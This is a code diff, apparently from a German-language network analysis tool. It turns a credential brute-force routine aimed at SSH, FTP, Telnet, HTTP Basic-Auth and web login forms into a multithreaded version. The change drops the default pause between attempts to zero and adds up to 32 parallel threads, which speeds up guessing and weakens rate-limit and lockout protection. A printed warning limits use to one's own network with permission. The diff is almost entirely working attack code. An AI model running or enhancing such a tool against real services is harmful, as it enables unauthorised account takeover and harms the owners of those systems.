@@ -486,12 +486,17 @@ class Analyzer:
         return [spec]
 
     def brute_force(self, ip, service, user_spec, pass_spec, port=None,
-                    delay=0.3, max_attempts=5000, stop_on_first=True):
-        """Echter Brute-Force-Angriff gegen einen Dienst.
+                    delay=0.0, max_attempts=5000, stop_on_first=True, workers=8):
+        """Echter, parallelisierter Brute-Force-Angriff gegen einen Dienst.
 
         service: ssh | ftp | telnet | http (Basic-Auth) | http-form (Formular)
         user_spec / pass_spec: einzelner Wert, Kommaliste oder Pfad zu einer Wortliste.
+        workers: Anzahl paralleler Threads (1 = sequentiell).
+        delay: optionale Pause (s) vor jedem Versuch (gegen Rate-Limits/Lockouts).
         """
+        import threading
+        from concurrent.futures import ThreadPoolExecutor
+
         try:
             service = (service or '').strip().lower()
             proto_map = {
@@ -505,82 +510,102 @@ class Analyzer:
             if service not in proto_map:
                 print(f"\n{Color.RED}Nicht unterstützter Dienst '{service}'. "
                       f"Erlaubt: ssh, ftp, telnet, http, http-form{Color.RESET}")
-                return
+                return []
 
             protocol, default_port = proto_map[service]
             port = int(port) if port else default_port
 
             usernames = self._load_credential_list(user_spec)
             passwords = self._load_credential_list(pass_spec)
-            total = len(usernames) * len(passwords)
+
+            # Kombinationen aufbauen und auf das Limit begrenzen
+            combos = [(u, p) for u in usernames for p in passwords]
+            limited = len(combos) > max_attempts
+            if limited:
+                combos = combos[:max_attempts]
+            total = len(combos)
+            workers = max(1, min(int(workers), 32))
 
             print(f"\n{Color.GREEN}Starte Brute-Force gegen {ip}:{port} "
                   f"({service}){Color.RESET}")
             print(f"{Color.BLUE}Benutzer: {len(usernames)} | Passwörter: {len(passwords)} "
-                  f"| Kombinationen: {total}{Color.RESET}")
+                  f"| Kombinationen: {total} | Threads: {workers}{Color.RESET}")
             print(f"{Color.YELLOW}Hinweis: Echte Login-Versuche – nur mit Genehmigung "
-                  f"im eigenen Netz! Pause: {delay}s, Limit: {max_attempts}.{Color.RESET}")
+                  f"im eigenen Netz! (Abbruch mit Strg+C){Color.RESET}")
+            if limited:
+                print(f"{Color.YELLOW}Achtung: auf {max_attempts} Versuche begrenzt.{Color.RESET}")
 
-            if total > max_attempts:
-                print(f"{Color.YELLOW}Achtung: {total} Kombinationen überschreiten das "
-                      f"Limit von {max_attempts}. Es wird nach {max_attempts} Versuchen "
-                      f"abgebrochen.{Color.RESET}")
-
-            found = []
-            attempts = 0
-            unreachable = 0
+            # Gemeinsamer, thread-sicherer Zustand
+            lock = threading.Lock()
+            print_lock = threading.Lock()
+            stop_event = threading.Event()
+            state = {'attempts': 0, 'unreachable': 0}
+            found = []                 # (user, pwd, detail)
+            found_users = set()        # Benutzer mit bereits gefundenem Treffer
             start = time.time()
 
-            for user in usernames:
-                user_found = False
-                for pwd in passwords:
-                    if attempts >= max_attempts:
-                        break
-                    attempts += 1
+            def worker(user, pwd):
+                if stop_event.is_set():
+                    return
+                if stop_on_first and user in found_users:
+                    return
+                if delay:
+                    time.sleep(delay)
 
-                    print(f"  [{attempts}/{min(total, max_attempts)}] "
-                          f"{user} / {pwd if pwd else '<leer>'}", flush=True)
+                if protocol == 'http-form':
+                    result, detail = self._test_http_form(ip, port, user, pwd)
+                elif protocol == 'http':
+                    result, detail = self._test_http(ip, port, user, pwd)
+                else:
+                    result, detail = self._test_credential(protocol, ip, port, user, pwd)
 
-                    if protocol == 'http-form':
-                        result, detail = self._test_http_form(ip, port, user, pwd)
-                    elif protocol == 'http':
-                        result, detail = self._test_http(ip, port, user, pwd)
-                    else:
-                        result, detail = self._test_credential(protocol, ip, port, user, pwd)
-
-                    if result is True:
-                        print(f"    {Color.RED}>>> TREFFER: {user} / "
-                              f"{pwd if pwd else '<leer>'}  ({detail}){Color.RESET}")
-                        found.append((user, pwd))
-                        user_found = True
-                        if stop_on_first:
-                            break
+                # Zustand aktualisieren und Anzeige-Entscheidungen unter Lock treffen
+                with lock:
+                    state['attempts'] += 1
+                    n = state['attempts']
+                    is_hit = (result is True)
+                    show_unreachable = False
+                    if is_hit:
+                        found.append((user, pwd, detail))
+                        found_users.add(user)
                     elif result is None:
-                        unreachable += 1
-                        print(f"    {Color.YELLOW}nicht testbar: {detail}{Color.RESET}")
-                        # Wenn der Dienst grundsätzlich nicht erreichbar/testbar ist,
-                        # bringt Weitermachen nichts -> früh abbrechen.
-                        if unreachable >= 3 and not found:
-                            print(f"\n{Color.YELLOW}Dienst scheint nicht testbar/erreichbar "
-                                  f"– breche ab.{Color.RESET}")
-                            self._print_brute_summary(found, attempts, start)
-                            return found
+                        state['unreachable'] += 1
+                        show_unreachable = (state['unreachable'] == 1)
+                        # Dienst offenbar nicht erreichbar/testbar -> global abbrechen
+                        if state['unreachable'] >= max(workers, 5) and not found:
+                            stop_event.set()
+                    show_progress = (n % 25 == 0)
 
-                    if delay:
-                        time.sleep(delay)
+                if is_hit:
+                    with print_lock:
+                        print(f"  {Color.RED}>>> TREFFER: {user} / "
+                              f"{pwd if pwd else '<leer>'}  ({detail}){Color.RESET}", flush=True)
+                elif show_unreachable:
+                    with print_lock:
+                        print(f"  {Color.YELLOW}nicht testbar: {detail}{Color.RESET}", flush=True)
+                if show_progress:
+                    with print_lock:
+                        print(f"  ... {n}/{total} geprüft ({len(found)} Treffer)", flush=True)
 
-                if attempts >= max_attempts:
-                    break
-                if user_found and stop_on_first:
-                    # Für diesen Benutzer gefunden; mit nächstem Benutzer weiter
-                    continue
+            try:
+                with ThreadPoolExecutor(max_workers=workers) as executor:
+                    futures = [executor.submit(worker, u, p) for (u, p) in combos]
+                    try:
+                        for f in futures:
+                            f.result()
+                    except KeyboardInterrupt:
+                        stop_event.set()
+                        print(f"\n{Color.YELLOW}Abbruch – warte auf laufende Threads...{Color.RESET}")
+            except KeyboardInterrupt:
+                stop_event.set()
 
-            self._print_brute_summary(found, attempts, start)
-            return found
+            if stop_event.is_set() and not found:
+                print(f"\n{Color.YELLOW}Dienst scheint nicht erreichbar/testbar – abgebrochen.{Color.RESET}")
 
-        except KeyboardInterrupt:
-            print(f"\n{Color.YELLOW}Brute-Force vom Benutzer abgebrochen.{Color.RESET}")
-            return []
+            found_pairs = [(u, p) for (u, p, _d) in found]
+            self._print_brute_summary(found_pairs, state['attempts'], start)
+            return found_pairs
+
         except Exception as e:
             logging.error(f"Fehler beim Brute-Force: {str(e)}")
             print(f"\n{Color.RED}Fehler beim Brute-Force: {str(e)}{Color.RESET}")
